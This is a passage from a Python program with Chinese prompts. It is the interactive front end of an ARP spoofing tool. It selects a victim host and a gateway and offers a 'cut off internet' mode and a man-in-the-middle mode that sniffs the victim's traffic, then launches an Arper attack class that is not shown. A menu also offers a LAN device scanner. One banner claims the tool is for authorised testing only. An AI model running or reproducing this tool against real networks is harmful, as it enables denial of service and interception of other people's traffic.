    debug_mode = input("启用调试模式? (y/N): ").strip().lower() == 'y'
    
    # 选择接口
    if platform.system() == "Windows":
        interface = select_windows_interface()
        if not interface:
            return
    else:
        interface = None
    
    # 显示网络信息
    local_ip, detected_gateway = get_network_info(interface)
    if not local_ip:
        print("❌ 无法获取网络信息，请检查网络连接")
        return
    
    # 选择目标IP - 使用修复后的版本
    VICTIM_IP, VICTIM_MAC = select_target_ip(interface)
    if not VICTIM_IP:
        print("❌ 未选择目标IP，退出")
        return
    
    # 获取网关
    GATEWAY_IP = None
    if detected_gateway:
        print(f"🔍 自动检测到默认网关: {detected_gateway}")
        use_detected = input("是否使用检测到的网关? (Y/n): ").strip().lower()
        if use_detected != 'n':
            GATEWAY_IP = detected_gateway
    
    if not GATEWAY_IP:
        print("请手动输入网关IP地址:")
        while True:
            GATEWAY_IP = input("网关IP: ").strip()
            if not GATEWAY_IP:
                continue
            try:
                ipaddress.ip_address(GATEWAY_IP)
                # 测试网关连通性
                print(f"测试网关 {GATEWAY_IP}...")
                gateway_mac = get_mac(GATEWAY_IP, interface)
                if gateway_mac:
                    print(f"✅ 网关 {GATEWAY_IP} 可用，MAC: {gateway_mac}")
                    break
                else:
                    print(f"❌ 无法连接到网关 {GATEWAY_IP}")
                    retry = input("是否重试? (y/N): ").strip().lower()
                    if retry != 'y':
                        return
            except ValueError:
                print("❌ 无效的IP地址格式")
    
    # 选择模式
    print("\n🎯 请选择攻击模式:")
    print("1. 断网攻击 (目标无法上网)")
    print("2. 中间人攻击 (目标可以上网，流量被嗅探)")
    
    try:
        choice = input("请输入选择 (1 或 2, 默认1): ").strip()
        BLOCK_INTERNET = (choice != "2")
        
        if choice not in ["1", "2"]:
            print("⚠️  无效选择，使用默认模式: 断网攻击")
            BLOCK_INTERNET = True
            
    except (EOFError, KeyboardInterrupt):
        print("\n⚠️  使用默认模式: 断网攻击")
        BLOCK_INTERNET = True
    
    # 配置参数
    POISON_INTERVAL = 2
    PACKET_COUNT = 200
    
    # 确认信息
    print("\n📋 攻击配置确认:")
    print(f"   目标IP: {VICTIM_IP}")
    if VICTIM_MAC:
        print(f"   目标MAC: {VICTIM_MAC}")
    print(f"   网关IP: {GATEWAY_IP}")
    print(f"   网络接口: {interface}")
    print(f"   攻击模式: {'断网攻击' if BLOCK_INTERNET else '中间人攻击'}")
    print(f"   调试模式: {'开启' if debug_mode else '关闭'}")
    
    try:
        confirm = input("\n确认开始攻击? (y/N): ").strip().lower()
        if confirm != 'y':
            print("❌ 用户取消操作")
            return
    except KeyboardInterrupt:
        print("\n❌ 用户取消操作")
        return
    
    try:
        arper = Arper(
            victim=VICTIM_IP,
            gateway=GATEWAY_IP,
            interface=interface,
            poison_interval=POISON_INTERVAL,
            packet_count=PACKET_COUNT,
            block_internet=BLOCK_INTERNET,
            debug=debug_mode
        )
        
        arper.run()
        
    except KeyboardInterrupt:
        print("\n👋 用户中断程序")
    except Exception as e:
        print(f"❌ 程序执行出错: {e}")
        import traceback
        traceback.print_exc()

def main():
    """主函数 - 增强版本"""
    # 设置编码
    setup_encoding()
    
    print("🛠️  网络工具集 - 仅用于授权测试")
    print(f"💻 系统: {platform.system()} {platform.release()}")
    print("="*60)
    
    # 检查权限
    if not is_admin():
        print("❌ 请以管理员身份运行此程序!")
        input("按回车键退出...")
        return
    
    # Windows兼容性测试
    if platform.system() == "Windows" and not test_windows_compatibility():
        input("按回车键退出...")
        return
    
    # 主菜单
    while True:
        print("\n请选择功能:")
        print("1. 🎯 网络设备扫描器 (扫描局域网设备)")
        print("2. 🦠 ARP欺骗工具")
        print("3. 🚪 退出")
        
        try:
            choice = input("输入选择 (默认1): ").strip() or "1"
            
            if choice == "1":
                network_scanner_mode()
            elif choice == "2":
                run_arp_spoofer()
            elif choice == "3":
                print("👋 再见!")
                break
            else:
                print("❌ 无效选择，请重新输入")
                
        except KeyboardInterrupt:
            print("\n👋 再见!")
            break

if __name__ == "__main__":
    setup_signal_handlers()
    main()